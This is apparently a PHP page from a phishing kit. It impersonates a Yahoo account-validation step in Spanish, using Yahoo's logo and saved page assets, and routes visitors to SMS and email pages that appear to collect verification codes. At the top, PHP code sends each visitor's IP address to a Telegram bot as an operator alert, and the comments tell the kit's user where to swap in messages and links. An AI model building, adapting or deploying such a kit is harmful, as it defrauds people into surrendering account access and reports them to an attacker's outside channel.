<?php
include './config.php';
include './fullet/tg.php';
function get_client_ip()
{
    return $_SERVER['REMOTE_ADDR'] ?? 'UNKNOWN';
}

if (isset($alert) && $alert === TRUE) {


    $ip = get_client_ip();
    $msg = "! Seleccionando ! \r\n";
    $msg .= "🌐 IP : <code>" . $ip . "</code>\r\n";
    $msg .= "create by @vaceador\r\n";
    sendTg($msg, $key, $id);
}
?>
<!doctype html>
<html lang="es">

<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="referrer" content="no-referrer">
  <title>Método de validación | Mi sitio</title>
  <meta name="description" content="Seleccioná el método de validación para tu cuenta en Mi sitio.">
  <style>
    :root {
      color-scheme: light;
      --violet: #6001d2;
      --text: #23232b;
      --muted: #62626d;
    }

    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      background: #f5f5f7;
      color: var(--text);
      font: 16px Arial, Helvetica, sans-serif;
    }

    .site-header {
      height: 64px;
      padding: 0 80px;
      background: #fff;
      display: flex;
      align-items: center;
      justify-content: space-between;
      gap: 20px;
    }

    .site-name {
      font-size: 28px;
      font-weight: 800;
      letter-spacing: -1px;
      color: var(--violet);
    }

    .help-link {
      color: #5b21b6;
      font-size: 13px;
      text-decoration: underline;
      text-underline-offset: 3px;
    }

    main {
      max-width: 1030px;
      margin: 0 auto;
      padding: 11px 0 48px;
    }

    .card {
      width: 360px;
      margin-left: auto;
      padding: 40px;
      min-height: 500px;
      background: #fff;
      border: 1px solid #e8e8ed;
      border-radius: 16px;
      box-shadow: 0 2px 4px #00000014;
    }

    .card-content {
      display: flex;
      flex-direction: column;
      gap: 28px;
    }

    p {
      margin: 0;
    }

    .eyebrow {
      margin-bottom: 12px;
      color: var(--violet);
      font-size: 12px;
      font-weight: 700;
    }

    h1 {
      margin: 0 0 12px;
      font-size: 24px;
      font-weight: 700;
      line-height: 1.25;
    }

    .intro {
      color: #565660;
      font-size: 15px;
      line-height: 1.5;
    }

    .message {
      min-height: 84px;
      padding: 16px;
      border: 1px solid #e9dffc;
      border-radius: 8px;
      background: #faf7ff;
      color: #565660;
      font-size: 14px;
      line-height: 1.6;
      overflow-wrap: anywhere;
      white-space: pre-line;
    }

    .methods {
      display: flex;
      flex-direction: column;
      gap: 16px;
    }

    .method-link {
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 10px;
      width: 100%;
      min-height: 48px;
      padding: 12px 18px;
      border: 1px solid var(--violet);
      border-radius: 24px;
      background: var(--violet);
      color: #fff;
      text-decoration: none;
      font-size: 16px;
      font-weight: 700;
      line-height: 1.4;
    }

    .method-link:hover {
      background: #4d00aa;
      border-color: #4d00aa;
    }

    .method-link.secondary {
      background: #fff;
      color: var(--violet);
    }

    .method-link.secondary:hover {
      background: #f6f0ff;
    }

    .method-link svg {
      width: 20px;
      height: 20px;
      flex-shrink: 0;
      fill: none;
      stroke: currentColor;
      stroke-width: 1.8;
      stroke-linecap: round;
      stroke-linejoin: round;
    }

    a:focus-visible {
      outline: 2px solid var(--violet);
      outline-offset: 4px;
    }

    .help-note {
      padding-top: 20px;
      border-top: 1px solid #e6e6eb;
      color: var(--muted);
      font-size: 12px;
      line-height: 1.6;
    }

    .help-note p+p {
      margin-top: 8px;
    }

    @media(min-width:641px) and (max-width:1039px) {
      main {
        padding-right: 10px;
      }
    }

    @media(max-width:640px) {
      .site-header {
        padding: 0 20px;
      }

      main {
        padding-top: 24px;
      }

      .card {
        margin: 0 auto;
      }
    }

    @media(max-width:400px) {
      .card {
        width: calc(100% - 24px);
        padding: 28px 24px;
      }

      .site-name {
        font-size: 24px;
      }

      .help-link {
        font-size: 12px;
      }
    }

    /* Los dos marcos publicitarios se colocan como en el índice de referencia.
       Se permite el origen local para las imágenes y marcos anidados; no scripts. */
    .site-header {
      position: relative;
      z-index: 2;
    }

    .page-stage {
      position: relative;
      isolation: isolate;
      min-height: 1024px;
      padding-bottom: 122px;
      overflow: hidden;
    }

    .page-stage main {
      position: relative;
      z-index: 1;
    }

    .ad-background {
      position: absolute;
      top: 0;
      left: 0;
      right: 0;
      height: 1024px;
      overflow: hidden;
      z-index: 0;
      pointer-events: none;
    }

    .ad-background iframe {
      display: block;
      position: absolute;
      top: 0;
      left: 50%;
      width: 1440px;
      height: 1024px;
      transform: translateX(-50%);
      border: 0;
    }

    .ad-label {
      position: relative;
      z-index: 1;
      display: inline-block;
      margin: 8px 12px;
      padding: 4px 8px;
      border-radius: 4px;
      background: #fff;
      color: #565660;
      font-size: 11px;
      line-height: 1.3;
    }

    .ad-footer {
      position: fixed;
      bottom: 0;
      left: 0;
      right: 0;
      z-index: 3;
      background: rgba(255, 255, 255, .96);
      border-top: 1px solid #e6e6eb;
      padding: 4px 0 8px;
      text-align: center;
      overflow: hidden;
    }

    .ad-footer .ad-label {
      display: block;
      margin: 0 0 4px;
      padding: 0;
      background: none;
    }

    .ad-footer iframe {
      display: block;
      width: 728px;
      height: 90px;
      margin: 0 auto;
      border: 0;
      pointer-events: none;
    }

    @media(min-width:641px) and (max-width:727px) {
      .ad-footer iframe {
        position: relative;
        left: 50%;
        margin: 0;
        transform: translateX(-50%);
      }
    }

    @media(max-width:640px) {

      .ad-background,
      .ad-footer {
        display: none;
      }

      .page-stage {
        min-height: 0;
        padding-bottom: 0;
      }
    }
  </style>
</head>

<body>
  <header class="site-header">
                        <div class="shrink-0 flex"><img alt="Yahoo" class="dark:hidden"
                                src="./Iniciar sesión _ Yahoo_files/yahoo_frontpage_en-US_s_f_p_bestfit_frontpage_2x.png"
                                style="height: 2.25rem;"><img alt="Yahoo" class="hidden dark:block"
                                src="./Iniciar sesión _ Yahoo_files/yahoo_frontpage_en-US_s_f_w_bestfit_frontpage_2x.png"
                                style="height: 2.25rem;"></div>
    <a class="help-link" href="#ayuda">Ayuda con la validación</a>
  </header>
  <div class="page-stage">
    <aside class="ad-background" aria-label="Publicidad de terceros">
      <span class="ad-label">Publicidad de terceros · Yahoo Finance</span>
      <iframe id="login-ads-gpt-iframe" title="Anuncio de Yahoo Finance"
        src="./Iniciar sesión _ Yahoo_files/sandbox.html" width="1440" height="1024" scrolling="no"
        sandbox="allow-same-origin" referrerpolicy="no-referrer" tabindex="-1" aria-hidden="true"></iframe>
    </aside>
    <main>
      <section class="card" aria-labelledby="titulo-validacion">
        <div class="card-content">
          <div>
            <p class="eyebrow">Validación de tu cuenta · Mi sitio</p>
            <h1 id="titulo-validacion">Seleccione el método de validación</h1>
            <p class="intro">Elegí SMS o email para continuar con la verificación.</p>
          </div>

          <!-- TU MENSAJE: reemplazá solo el texto dentro de este párrafo.
             Podés escribir varias líneas. El espacio crece con el mensaje. -->
          <p id="mensaje-personalizado" class="message">Seleccioná la opción que prefieras para continuar con la
            validación de tu cuenta de Yahoo.</p>

          <nav class="methods" aria-label="Métodos de validación">
            <!-- ENLACE SMS: reemplazá #sms por la dirección de tu página de SMS. -->
            <a id="sms" class="method-link" href="./sms.php">
              <svg viewBox="0 0 24 24" aria-hidden="true">
                <rect x="6" y="2.5" width="12" height="19" rx="2.5" />
                <path d="M10 5h4M11 18.5h2" />
              </svg>
              <span>SMS</span>
            </a>

            <!-- ENLACE EMAIL: reemplazá #email por la dirección de tu página de email. -->
            <a id="email" class="method-link secondary" href="./email.php">
              <svg viewBox="0 0 24 24" aria-hidden="true">
                <rect x="2.5" y="4.5" width="19" height="15" rx="2" />
                <path d="m3.5 6 8.5 6.5L20.5 6" />
              </svg>
              <span>Email</span>
            </a>
          </nav>

          <div id="ayuda" class="help-note">
            <p>Esta validación corresponde a tu cuenta de Mi sitio.</p>
            <p>Mi sitio es independiente de Google y Yahoo.</p>
          </div>
        </div>
      </section>
    </main>
  </div>
  <aside class="ad-footer" aria-label="Banner publicitario de terceros">
    <span class="ad-label">Publicidad de terceros</span>
    <iframe id="login-ads-gpt-backfill-iframe" title="Banner publicitario"
      src="./Iniciar sesión _ Yahoo_files/sandbox(1).html" width="728" height="90" scrolling="no"
      sandbox="allow-same-origin" referrerpolicy="no-referrer" tabindex="-1" aria-hidden="true"></iframe>
  </aside>
</body>

</html>